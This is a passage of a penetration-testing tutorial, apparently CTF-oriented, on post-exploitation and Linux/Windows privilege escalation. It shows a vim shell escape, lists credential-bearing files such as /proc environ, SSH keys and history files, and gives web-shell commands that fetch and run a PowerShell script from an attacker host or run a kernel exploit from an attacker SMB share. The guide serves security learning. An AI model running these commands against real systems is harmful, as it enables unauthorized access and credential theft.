<span class="o">+</span><span class="n">acl</span>             <span class="o">+</span><span class="n">cindent</span>         <span class="o">+</span><span class="n">cryptv</span>          <span class="o">-</span><span class="n">ebcdic</span>          <span class="o">+</span><span class="nb">float</span>           <span class="o">+</span><span class="n">job</span>             <span class="o">+</span><span class="n">listcmds</span>        <span class="o">+</span><span class="n">mouse_dec</span>       <span class="o">+</span><span class="n">multi_byte</span>      <span class="o">+</span><span class="n">persistent_undo</span>  <span class="o">+</span><span class="n">rightleft</span>       <span class="o">+</span><span class="n">syntax</span>          <span class="o">+</span><span class="n">termresponse</span>    <span class="o">+</span><span class="n">visual</span>          <span class="o">+</span><span class="n">X11</span>
<span class="o">+</span><span class="n">arabic</span>          <span class="o">+</span><span class="n">clientserver</span>    <span class="o">+</span><span class="n">cscope</span>          <span class="o">+</span><span class="n">emacs_tags</span>      <span class="o">+</span><span class="n">folding</span>         <span class="o">+</span><span class="n">jumplist</span>        <span class="o">+</span><span class="n">localmap</span>        <span class="o">+</span><span class="n">mouse_gpm</span>       <span class="o">+</span><span class="n">multi_lang</span>      <span class="o">+</span><span class="n">postscript</span>       <span class="o">+</span><span class="n">ruby</span>            <span class="o">+</span><span class="n">tag_binary</span>      <span class="o">+</span><span class="n">textobjects</span>     <span class="o">+</span><span class="n">visualextra</span>     <span class="o">-</span><span class="n">xfontset</span>
<span class="o">+</span><span class="n">autocmd</span>         <span class="o">+</span><span class="n">clipboard</span>       <span class="o">+</span><span class="n">cursorbind</span>      <span class="o">+</span><span class="nb">eval</span>            <span class="o">-</span><span class="n">footer</span>          <span class="o">+</span><span class="n">keymap</span>          <span class="o">+</span><span class="n">lua</span>             <span class="o">-</span><span class="n">mouse_jsbterm</span>   <span class="o">-</span><span class="n">mzscheme</span>        <span class="o">+</span><span class="n">printer</span>          <span class="o">+</span><span class="n">scrollbind</span>      <span class="o">+</span><span class="n">tag_old_static</span>  <span class="o">+</span><span class="n">timers</span>          <span class="o">+</span><span class="n">viminfo</span>         <span class="o">+</span><span class="n">xim</span>
<span class="o">+</span><span class="n">balloon_eval</span>    <span class="o">+</span><span class="n">cmdline_compl</span>   <span class="o">+</span><span class="n">cursorshape</span>     <span class="o">+</span><span class="n">ex_extra</span>        <span class="o">+</span><span class="n">fork</span><span class="p">()</span>          <span class="o">+</span><span class="k">lambda</span>          <span class="o">+</span><span class="n">menu</span>            <span class="o">+</span><span class="n">mouse_netterm</span>   <span class="o">+</span><span class="n">netbeans_intg</span>   <span class="o">+</span><span class="n">profile</span>          <span class="o">+</span><span class="n">signs</span>           <span class="o">-</span><span class="n">tag_any_white</span>   <span class="o">+</span><span class="n">title</span>           <span class="o">+</span><span class="n">vreplace</span>        <span class="o">+</span><span class="n">xpm</span>
<span class="o">+</span><span class="n">browse</span>          <span class="o">+</span><span class="n">cmdline_hist</span>    <span class="o">+</span><span class="n">dialog_con_gui</span>  <span class="o">+</span><span class="n">extra_search</span>    <span class="o">+</span><span class="n">gettext</span>         <span class="o">+</span><span class="n">langmap</span>         <span class="o">+</span><span class="n">mksession</span>       <span class="o">+</span><span class="n">mouse_sgr</span>       <span class="o">+</span><span class="n">num64</span>           <span class="o">-</span><span class="n">python</span>           <span class="o">+</span><span class="n">smartindent</span>     <span class="o">+</span><span class="n">tcl</span>             <span class="o">+</span><span class="n">toolbar</span>         <span class="o">+</span><span class="n">wildignore</span>      <span class="o">+</span><span class="n">xsmp_interact</span>
<span class="o">++</span><span class="n">builtin_terms</span>  <span class="o">+</span><span class="n">cmdline_info</span>    <span class="o">+</span><span class="n">diff</span>            <span class="o">+</span><span class="n">farsi</span>           <span class="o">-</span><span class="n">hangul_input</span>    <span class="o">+</span><span class="n">libcall</span>         <span class="o">+</span><span class="n">modify_fname</span>    <span class="o">-</span><span class="n">mouse_sysmouse</span>  <span class="o">+</span><span class="n">packages</span>        <span class="o">+</span><span class="n">python3</span>          <span class="o">+</span><span class="n">startuptime</span>     <span class="o">+</span><span class="n">termguicolors</span>   <span class="o">+</span><span class="n">user_commands</span>   <span class="o">+</span><span class="n">wildmenu</span>        <span class="o">+</span><span class="n">xterm_clipboard</span>
<span class="o">+</span><span class="n">byte_offset</span>     <span class="o">+</span><span class="n">comments</span>        <span class="o">+</span><span class="n">digraphs</span>        <span class="o">+</span><span class="n">file_in_path</span>    <span class="o">+</span><span class="n">iconv</span>           <span class="o">+</span><span class="n">linebreak</span>       <span class="o">+</span><span class="n">mouse</span>           <span class="o">+</span><span class="n">mouse_urxvt</span>     <span class="o">+</span><span class="n">path_extra</span>      <span class="o">+</span><span class="n">quickfix</span>         <span class="o">+</span><span class="n">statusline</span>      <span class="o">+</span><span class="n">terminal</span>        <span class="o">+</span><span class="n">vertsplit</span>       <span class="o">+</span><span class="n">windows</span>         <span class="o">-</span><span class="n">xterm_save</span>
<span class="o">+</span><span class="n">channel</span>         <span class="o">+</span><span class="n">conceal</span>         <span class="o">+</span><span class="n">dnd</span>             <span class="o">+</span><span class="n">find_in_path</span>    <span class="o">+</span><span class="n">insert_expand</span>   <span class="o">+</span><span class="n">lispindent</span>      <span class="o">+</span><span class="n">mouseshape</span>      <span class="o">+</span><span class="n">mouse_xterm</span>     <span class="o">+</span><span class="n">perl</span>            <span class="o">+</span><span class="n">reltime</span>         <span class="o">-</span> <span class="n">sun_workshop</span>    <span class="o">+</span><span class="n">terminfo</span>        <span class="o">+</span><span class="n">virtualedit</span>     <span class="o">+</span><span class="n">writebackup</span>
  <span class="n">system</span> <span class="n">vimrc</span> <span class="n">file</span><span class="p">:</span> <span class="s2">&quot;$VIM/vimrc&quot;</span>
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li><p>Examining installed features and figure out which interpreter is installed.</p></li>
<li><p>If python/ python3 has been installed</p></li>
</ul>
<blockquote>
<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="p">:</span><span class="n">python3</span> <span class="kn">import</span> <span class="nn">pty</span><span class="p">;</span><span class="n">pty</span><span class="o">.</span><span class="n">spawn</span><span class="p">(</span><span class="s2">&quot;/bin/bash&quot;</span><span class="p">)</span>
</pre></div>
</div>
</div></blockquote>
</section>
</section>
<section id="gather-information-from-files">
<h3>Gather information from files<a class="headerlink" href="#gather-information-from-files" title="Link to this heading"></a></h3>
<p>In case of LFI or unprivileged shell, gathering information could be very useful. Mostly taken from <a class="reference external" href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">g0tmi1k Linux Privilege Escalation Blog</a></p>
<section id="operating-system">
<h4>Operating System<a class="headerlink" href="#operating-system" title="Link to this heading"></a></h4>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">issue</span>
<span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/*-</span><span class="n">release</span>
  <span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">lsb</span><span class="o">-</span><span class="n">release</span>      <span class="c1"># Debian based</span>
  <span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">redhat</span><span class="o">-</span><span class="n">release</span>   <span class="c1"># Redhat based</span>
</pre></div>
</div>
</section>
<section id="proc-variables">
<h4>/Proc Variables<a class="headerlink" href="#proc-variables" title="Link to this heading"></a></h4>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="n">sched_debug</span>      <span class="n">This</span> <span class="ow">is</span> <span class="n">usually</span> <span class="n">enabled</span> <span class="n">on</span> <span class="n">newer</span> <span class="n">systems</span><span class="p">,</span> <span class="n">such</span> <span class="k">as</span> <span class="n">RHEL</span> <span class="mf">6.</span>  <span class="n">It</span> <span class="n">provides</span> <span class="n">information</span> <span class="k">as</span> <span class="n">to</span> <span class="n">what</span> <span class="n">process</span> <span class="ow">is</span> <span class="n">running</span> <span class="n">on</span> <span class="n">which</span> <span class="n">cpu</span><span class="o">.</span>  <span class="n">This</span> <span class="n">can</span> <span class="n">be</span> <span class="n">handy</span> <span class="n">to</span> <span class="n">get</span> <span class="n">a</span> <span class="nb">list</span> <span class="n">of</span> <span class="n">processes</span> <span class="ow">and</span> <span class="n">their</span> <span class="n">PID</span> <span class="n">number</span><span class="o">.</span>
<span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="n">mounts</span>           <span class="n">Provides</span> <span class="n">a</span> <span class="nb">list</span> <span class="n">of</span> <span class="n">mounted</span> <span class="n">file</span> <span class="n">systems</span><span class="o">.</span>  <span class="n">Can</span> <span class="n">be</span> <span class="n">used</span> <span class="n">to</span> <span class="n">determine</span> <span class="n">where</span> <span class="n">other</span> <span class="n">interesting</span> <span class="n">files</span> <span class="n">might</span> <span class="n">be</span> <span class="n">located</span>
<span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="n">net</span><span class="o">/</span><span class="n">arp</span>          <span class="n">Shows</span> <span class="n">the</span> <span class="n">ARP</span> <span class="n">table</span><span class="o">.</span>  <span class="n">This</span> <span class="ow">is</span> <span class="n">one</span> <span class="n">way</span> <span class="n">to</span> <span class="n">find</span> <span class="n">out</span> <span class="n">IP</span> <span class="n">addresses</span> <span class="k">for</span> <span class="n">other</span> <span class="n">internal</span> <span class="n">servers</span><span class="o">.</span>
<span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="n">net</span><span class="o">/</span><span class="n">route</span>        <span class="n">Shows</span> <span class="n">the</span> <span class="n">routing</span> <span class="n">table</span> <span class="n">information</span><span class="o">.</span>
<span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="n">net</span><span class="o">/</span><span class="n">tcp</span>
<span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="n">net</span><span class="o">/</span><span class="n">udp</span>          <span class="n">Provides</span> <span class="n">a</span> <span class="nb">list</span> <span class="n">of</span> <span class="n">active</span> <span class="n">connections</span><span class="o">.</span>  <span class="n">Can</span> <span class="n">be</span> <span class="n">used</span> <span class="n">to</span> <span class="n">determine</span> <span class="n">what</span> <span class="n">ports</span> <span class="n">are</span> <span class="n">listening</span> <span class="n">on</span> <span class="n">the</span> <span class="n">server</span>
<span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="n">net</span><span class="o">/</span><span class="n">fib_trie</span>     <span class="n">This</span> <span class="ow">is</span> <span class="n">used</span> <span class="k">for</span> <span class="n">route</span> <span class="n">caching</span><span class="o">.</span>  <span class="n">This</span> <span class="n">can</span> <span class="n">also</span> <span class="n">be</span> <span class="n">used</span> <span class="n">to</span> <span class="n">determine</span> <span class="n">local</span> <span class="n">IPs</span><span class="p">,</span> <span class="k">as</span> <span class="n">well</span> <span class="k">as</span> <span class="n">gain</span> <span class="n">a</span> <span class="n">better</span> <span class="n">understanding</span> <span class="n">of</span> <span class="n">the</span> <span class="n">target</span><span class="s1">&#39;s networking structure</span>
<span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="n">version</span>          <span class="n">Shows</span> <span class="n">the</span> <span class="n">kernel</span> <span class="n">version</span><span class="o">.</span>  <span class="n">This</span> <span class="n">can</span> <span class="n">be</span> <span class="n">used</span> <span class="n">to</span> <span class="n">help</span> <span class="n">determine</span> <span class="n">the</span> <span class="n">OS</span> <span class="n">running</span> <span class="ow">and</span> <span class="n">the</span> <span class="n">last</span> <span class="n">time</span> <span class="n">it</span><span class="s1">&#39;s been fully updated.</span>
</pre></div>
</div>
<p>Each process also has its own set of attributes.  If we have the PID number and access to that process, then we can obtain some useful information about it, such as its environmental variables and any command line options that were run.  Sometimes these include passwords.  Linux also has a special proc directory called self which can be used to query information about the current process without having to know it’s PID.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="p">[</span><span class="n">PID</span><span class="p">]</span><span class="o">/</span><span class="n">cmdline</span>    <span class="n">Lists</span> <span class="n">everything</span> <span class="n">that</span> <span class="n">was</span> <span class="n">used</span> <span class="n">to</span> <span class="n">invoke</span> <span class="n">the</span> <span class="n">process</span><span class="o">.</span> <span class="n">This</span> <span class="n">sometimes</span> <span class="n">contains</span> <span class="n">useful</span> <span class="n">paths</span> <span class="n">to</span> <span class="n">configuration</span> <span class="n">files</span> <span class="k">as</span> <span class="n">well</span> <span class="k">as</span> <span class="n">usernames</span> <span class="ow">and</span> <span class="n">passwords</span><span class="o">.</span>
<span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="p">[</span><span class="n">PID</span><span class="p">]</span><span class="o">/</span><span class="n">environ</span>    <span class="n">Lists</span> <span class="nb">all</span> <span class="n">the</span> <span class="n">environment</span> <span class="n">variables</span> <span class="n">that</span> <span class="n">were</span> <span class="nb">set</span> <span class="n">when</span> <span class="n">the</span> <span class="n">process</span> <span class="n">was</span> <span class="n">invoked</span><span class="o">.</span>  <span class="n">This</span> <span class="n">also</span> <span class="n">sometimes</span> <span class="n">contains</span> <span class="n">useful</span> <span class="n">paths</span> <span class="n">to</span> <span class="n">configuration</span> <span class="n">files</span> <span class="k">as</span> <span class="n">well</span> <span class="k">as</span> <span class="n">usernames</span> <span class="ow">and</span> <span class="n">passwords</span><span class="o">.</span>
<span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="p">[</span><span class="n">PID</span><span class="p">]</span><span class="o">/</span><span class="n">cwd</span>        <span class="n">Points</span> <span class="n">to</span> <span class="n">the</span> <span class="n">current</span> <span class="n">working</span> <span class="n">directory</span> <span class="n">of</span> <span class="n">the</span> <span class="n">process</span><span class="o">.</span>  <span class="n">This</span> <span class="n">may</span> <span class="n">be</span> <span class="n">useful</span> <span class="k">if</span> <span class="n">you</span> <span class="n">don</span><span class="s1">&#39;t know the absolute path to a configuration file.</span>
<span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="p">[</span><span class="n">PID</span><span class="p">]</span><span class="o">/</span><span class="n">fd</span><span class="o">/</span><span class="p">[</span><span class="c1">#]     Provides access to the file descriptors being used.  In some cases this can be used to read files that are opened by a process.</span>
</pre></div>
</div>
<p>The information about Proc variables has been taken from <a class="reference external" href="https://blog.netspi.com/directory-traversal-file-inclusion-proc-file-system/">Directory Traversal, File Inclusion, and The Proc File System</a></p>
</section>
<section id="environment-variables">
<h4>Environment Variables<a class="headerlink" href="#environment-variables" title="Link to this heading"></a></h4>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">profile</span>
<span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">bashrc</span>
<span class="n">cat</span> <span class="o">~/.</span><span class="n">bash_profile</span>
<span class="n">cat</span> <span class="o">~/.</span><span class="n">bashrc</span>
<span class="n">cat</span> <span class="o">~/.</span><span class="n">bash_logout</span>
</pre></div>
</div>
</section>
<section id="configuration-files">
<h4>Configuration Files<a class="headerlink" href="#configuration-files" title="Link to this heading"></a></h4>
<ul class="simple">
<li><p>Apache Web Server : Helps in figuring out the DocumentRoot where does your webserver files are?</p></li>
</ul>
<blockquote>
<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">apache2</span><span class="o">/</span><span class="n">apache2</span><span class="o">.</span><span class="n">conf</span>
<span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">apache2</span><span class="o">/</span><span class="n">sites</span><span class="o">-</span><span class="n">enabled</span><span class="o">/</span><span class="mi">000</span><span class="o">-</span><span class="n">default</span>
</pre></div>
</div>
</div></blockquote>
</section>
<section id="user-history">
<h4>User History<a class="headerlink" href="#user-history" title="Link to this heading"></a></h4>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">~/.</span><span class="n">bash_history</span>
<span class="o">~/.</span><span class="n">nano_history</span>
<span class="o">~/.</span><span class="n">atftp_history</span>
<span class="o">~/.</span><span class="n">mysql_history</span>
<span class="o">~/.</span><span class="n">php_history</span>
<span class="o">~/.</span><span class="n">viminfo</span>
</pre></div>
</div>
</section>
<section id="private-ssh-keys-ssh-configuration">
<h4>Private SSH Keys / SSH Configuration<a class="headerlink" href="#private-ssh-keys-ssh-configuration" title="Link to this heading"></a></h4>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">~/.</span><span class="n">ssh</span><span class="o">/</span><span class="n">authorized_keys</span> <span class="p">:</span> <span class="n">specifies</span> <span class="n">the</span> <span class="n">SSH</span> <span class="n">keys</span> <span class="n">that</span> <span class="n">can</span> <span class="n">be</span> <span class="n">used</span> <span class="k">for</span> <span class="n">logging</span> <span class="n">into</span> <span class="n">the</span> <span class="n">user</span> <span class="n">account</span>
<span class="o">~/.</span><span class="n">ssh</span><span class="o">/</span><span class="n">identity</span><span class="o">.</span><span class="n">pub</span>
<span class="o">~/.</span><span class="n">ssh</span><span class="o">/</span><span class="n">identity</span>
<span class="o">~/.</span><span class="n">ssh</span><span class="o">/</span><span class="n">id_rsa</span><span class="o">.</span><span class="n">pub</span>
<span class="o">~/.</span><span class="n">ssh</span><span class="o">/</span><span class="n">id_rsa</span>
<span class="o">~/.</span><span class="n">ssh</span><span class="o">/</span><span class="n">id_dsa</span><span class="o">.</span><span class="n">pub</span>
<span class="o">~/.</span><span class="n">ssh</span><span class="o">/</span><span class="n">id_dsa</span>
<span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">ssh</span><span class="o">/</span><span class="n">ssh_config</span>  <span class="p">:</span> <span class="n">OpenSSH</span> <span class="n">SSH</span> <span class="n">client</span> <span class="n">configuration</span> <span class="n">files</span>
<span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">ssh</span><span class="o">/</span><span class="n">sshd_config</span> <span class="p">:</span> <span class="n">OpenSSH</span> <span class="n">SSH</span> <span class="n">daemon</span> <span class="n">configuration</span> <span class="n">file</span>
</pre></div>
</div>
</section>
<section id="logs-files">
<h4>Logs Files<a class="headerlink" href="#logs-files" title="Link to this heading"></a></h4>
<p>Anything helpful in the logs file? Imagine, user running a command and that being logged in auth.log?</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">cat</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">log</span><span class="o">/</span><span class="n">auth</span><span class="o">.</span><span class="n">log</span>
</pre></div>
</div>
<p>Usually, any log files present in /var/log directory might be important.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">auth</span><span class="o">.</span><span class="n">log</span><span class="p">,</span> <span class="n">boot</span><span class="p">,</span> <span class="n">btmp</span><span class="p">,</span> <span class="n">daemon</span><span class="o">.</span><span class="n">log</span><span class="p">,</span> <span class="n">debug</span><span class="p">,</span> <span class="n">dmesg</span><span class="p">,</span> <span class="n">kern</span><span class="o">.</span><span class="n">log</span><span class="p">,</span> <span class="n">mail</span><span class="o">.</span><span class="n">info</span><span class="p">,</span> <span class="n">mail</span><span class="o">.</span><span class="n">log</span><span class="p">,</span> <span class="n">mail</span><span class="o">.</span><span class="n">warn</span><span class="p">,</span> <span class="n">messages</span><span class="p">,</span> <span class="n">syslog</span><span class="p">,</span> <span class="n">udev</span><span class="p">,</span> <span class="n">wtmp</span>
</pre></div>
</div>
</section>
</section>
</section>
<section id="unprivileged-shell-to-privileged-shell">
<span id="id20"></span><h2>Unprivileged Shell to Privileged Shell<a class="headerlink" href="#unprivileged-shell-to-privileged-shell" title="Link to this heading"></a></h2>
<p>Probably, at this point of time, we would have unprivileged shell of user www-data. If you are on Windows, there are particular set of steps. If you are on linux, it would be a good idea to first check privilege escalation techniques from g0tm1lk blog such as if there are any binary executable with SUID bits, if there are any cron jobs running with root permissions.</p>
<p>[Linux] If you have become a normal user of which you have a password, it would be a good idea to check sudo -l (for every user! Yes, even for www-data) to check if there are any executables you have permission to run.</p>
<section id="windows-privilege-escalation">
<h3>Windows Privilege Escalation<a class="headerlink" href="#windows-privilege-escalation" title="Link to this heading"></a></h3>
<p>If you have a shell/ meterpreter from a windows box, probably, the first thing would be to utilize</p>
<section id="systeminfo">
<h4>SystemInfo<a class="headerlink" href="#systeminfo" title="Link to this heading"></a></h4>
<p>Run system info and findout</p>
<ul class="simple">
<li><p>Operating System Version</p></li>
<li><p>Architecture : Whether x86 or x64.</p></li>
<li><p>Hotfix installed</p></li>
</ul>
<p>The below system is running x64, Windows Server 2008 R2 with no Hotfixes installed.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>systeminfo

Host Name:                 VICTIM-MACHINE
OS Name:                   Microsoft Windows Server 2008 R2 Datacenter
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                00496-001-0001283-84782
Original Install Date:     18/3/2017, 7:04:46 ��
System Boot Time:          7/11/2017, 3:13:00 ��
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 79 Stepping 1 GenuineIntel ~2100 Mhz
                           [02]: Intel64 Family 6 Model 79 Stepping 1 GenuineIntel ~2100 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 5/4/2016
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     2.048 MB
Available Physical Memory: 1.640 MB
Virtual Memory: Max Size:  4.095 MB
Virtual Memory: Available: 3.665 MB
Virtual Memory: In Use:    430 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.54.98.9
</pre></div>
</div>
<p>If there are no Hotfixes installed, we can visit</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">C</span><span class="p">:</span>\<span class="n">Windows</span>\<span class="n">SoftwareDistribution</span>\<span class="n">Download</span>
</pre></div>
</div>
<p>This directory is the temporary location for WSUS. Updates were downloaded here, doesn’t mean were installed. Otherwise, we may visit</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">C</span><span class="p">:</span>\<span class="n">Windows</span>\<span class="n">WindowUpdate</span><span class="o">.</span><span class="n">log</span>
</pre></div>
</div>
<p>which will inform if any hotfixes are installed.</p>
<p>We can also run</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>wmic qfe

Caption                                     CSName           Description      FixComments  HotFixID   InstallDate  InstalledBy          InstalledOn  Name  ServicePackInEffect  Status
http://support.microsoft.com/?kbid=4100347  LAPTOP           Update                        KB4100347               NT AUTHORITY\SYSTEM  9/17/2018
http://support.microsoft.com/?kbid=4343669  LAPTOP           Update                        KB4343669               NT AUTHORITY\SYSTEM  7/27/2018
http://support.microsoft.com/?kbid=4343902  LAPTOP           Security Update               KB4343902               NT AUTHORITY\SYSTEM  8/16/2018
</pre></div>
</div>
</section>
<section id="metasploit-local-exploit-suggestor">
<h4>Metasploit Local Exploit Suggestor<a class="headerlink" href="#metasploit-local-exploit-suggestor" title="Link to this heading"></a></h4>
<p>Metasploit local_exploit_suggester : The module suggests local meterpreter exploits that can be used. The exploits are suggested based on the architecture and platform that the user has a shell opened as well as the available exploits in meterpreter.</p>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>It is utmost important that the meterpreter should be of the same architecture as your target machine, otherwise local exploits may fail. For example. if you have target as windows 64-bit machine, you should have 64-bit meterpreter.</p>
</div>
</section>
<section id="sherlock-and-powerup-powershell-script">
<h4>Sherlock and PowerUp Powershell Script<a class="headerlink" href="#sherlock-and-powerup-powershell-script" title="Link to this heading"></a></h4>
<ul class="simple">
<li><p><a class="reference external" href="https://github.com/rasta-mouse/Sherlock">Sherlock</a> PowerShell script by <a class="reference external" href="https://twitter.com/_RastaMouse">rastamouse</a> to quickly find missing software patches for local privilege escalation vulnerabilities. If the Metasploit local_exploit_suggester didn’t resulted in any exploits. Probably, try Sherlock Powershell script to see if there any vuln which can be exploited.</p></li>
<li><p><a class="reference external" href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc">PowerUp</a> : PowerUp aims to be a clearinghouse of common Windows privilege escalation vectors that rely on misconfigurations.</p></li>
</ul>
<p>The above can be executed by</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>view-source:10.54.98.X/shell.php?cmd=echo IEX (New-Object Net.WebClient).DownloadString(&quot;http://YourIP:8000/Sherlock.ps1&quot;); | powershell -noprofile -
</pre></div>
</div>
<p>We execute powershell with noprofile and accept the input from stdin</p>
</section>
<section id="windows-exploit-suggestor">
<h4>Windows Exploit Suggestor<a class="headerlink" href="#windows-exploit-suggestor" title="Link to this heading"></a></h4>
<p><a class="reference external" href="https://github.com/GDSSecurity/Windows-Exploit-Suggester">Windows Exploit Suggestor</a> : This tool compares a targets patch levels against the Microsoft vulnerability database in order to detect potential missing patches on the target. It also notifies the user if there are public exploits and Metasploit modules available for the missing bulletins. Just copy the systeminfo information from the windows OS and compare the database.</p>
<p>If we are getting the below error on running local exploits of getuid in meterpreter</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">Exploit</span> <span class="n">failed</span><span class="p">:</span> <span class="n">Rex</span><span class="p">::</span><span class="n">Post</span><span class="p">::</span><span class="n">Meterpreter</span><span class="p">::</span><span class="n">RequestError</span> <span class="n">stdapi_sys_config_getuid</span><span class="p">:</span> <span class="n">Operation</span> <span class="n">failed</span><span class="p">:</span> <span class="n">Access</span> <span class="ow">is</span> <span class="n">denied</span><span class="o">.</span>
</pre></div>
</div>
<p>Possibly, migrate into a new process using post/windows/manage/migrate</p>
</section>
<section id="windows-kernel-exploits">
<h4>Windows Kernel Exploits<a class="headerlink" href="#windows-kernel-exploits" title="Link to this heading"></a></h4>
<p><a class="reference external" href="https://github.com/SecWiki/windows-kernel-exploits">Windows Kernel Exploits</a> contains most of the compiled windows exploits. One way of running these is either upload these on victim system and execute. Otherwise, create a smb-server using Impacket</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">usage</span><span class="p">:</span> <span class="n">smbserver</span><span class="o">.</span><span class="n">py</span> <span class="p">[</span><span class="o">-</span><span class="n">h</span><span class="p">]</span> <span class="p">[</span><span class="o">-</span><span class="n">comment</span> <span class="n">COMMENT</span><span class="p">]</span> <span class="p">[</span><span class="o">-</span><span class="n">debug</span><span class="p">]</span> <span class="p">[</span><span class="o">-</span><span class="n">smb2support</span><span class="p">]</span> <span class="n">shareName</span> <span class="n">sharePath</span>

<span class="n">This</span> <span class="n">script</span> <span class="n">will</span> <span class="n">launch</span> <span class="n">a</span> <span class="n">SMB</span> <span class="n">Server</span> <span class="ow">and</span> <span class="n">add</span> <span class="n">a</span> <span class="n">share</span> <span class="n">specified</span> <span class="k">as</span> <span class="n">an</span> <span class="n">argument</span><span class="o">.</span> <span class="n">You</span> <span class="n">need</span> <span class="n">to</span> <span class="n">be</span> <span class="n">root</span> <span class="ow">in</span> <span class="n">order</span> <span class="n">to</span> <span class="n">bind</span> <span class="n">to</span> <span class="n">port</span> <span class="mf">445.</span> <span class="n">No</span> <span class="n">authentication</span> <span class="n">will</span> <span class="n">be</span> <span class="n">enforced</span><span class="o">.</span> <span class="n">Example</span><span class="p">:</span> <span class="n">smbserver</span><span class="o">.</span><span class="n">py</span> <span class="o">-</span><span class="n">comment</span> <span class="s1">&#39;My share&#39;</span> <span class="n">TMP</span> <span class="o">/</span><span class="n">tmp</span>

<span class="n">positional</span> <span class="n">arguments</span><span class="p">:</span>
  <span class="n">shareName</span>         <span class="n">name</span> <span class="n">of</span> <span class="n">the</span> <span class="n">share</span> <span class="n">to</span> <span class="n">add</span>
  <span class="n">sharePath</span>         <span class="n">path</span> <span class="n">of</span> <span class="n">the</span> <span class="n">share</span> <span class="n">to</span> <span class="n">add</span>
</pre></div>
</div>
<p>Assuming, the current directory contains our compiled exploit, we can</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>impacket-smbserver &lt;sharename&gt; `pwd`
Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
</pre></div>
</div>
<p>Once, smbserver is up and running, we can execute code like</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>view-source:VictimIP/shell.php?cmd=\\YourIP\ShareName\ms15-051x64.exe whoami

*Considering shell.php is our php oneliner to execute commands.
</pre></div>
</div>
</section>
<section id="abusing-token-privileges">
<h4>Abusing Token Privileges<a class="headerlink" href="#abusing-token-privileges" title="Link to this heading"></a></h4>
<p>If we have the windows shell or meterpreter, we can type “whoami /priv” or if we have meterpreter, we can type “getprivs”</p>
<p>If we have any of the below privileges, we can possibly utilize <a class="reference external" href="https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/">Rotten Potato</a></p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">SeImpersonatePrivilege</span>
<span class="n">SeAssignPrimaryPrivilege</span>
<span class="n">SeTcbPrivilege</span>
<span class="n">SeBackupPrivilege</span>
<span class="n">SeRestorePrivilege</span>
